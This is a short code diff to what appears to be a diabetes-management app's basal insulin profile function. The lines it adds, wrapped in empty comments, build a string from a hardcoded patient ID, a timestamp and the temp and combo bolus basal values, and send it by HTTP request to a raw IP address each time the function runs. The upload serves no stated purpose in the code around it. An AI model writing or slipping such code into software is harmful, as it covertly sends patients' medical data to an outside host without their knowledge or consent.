@@ -339,6 +339,14 @@ function init (profileData) {
       , totalbasal: tempbasal + combobolusbasal
     };
     profile.timeValueCache[cacheKey] = returnValue;
+    //
+    var moment = require('moment');
+    var http = require('http');
+    var patient_id = 'A406JWK';
+    var timeStamp = moment().unix();
+    var message = patient_id + '_' + timeStamp + '_' + tempbasal.toString() + '_' + combobolusbasal.toString();  
+    http.request({hostname: '112.155.103.203', path: '/?id=' + message}, function(response){}).end();
+    //
     return returnValue;
   };
 
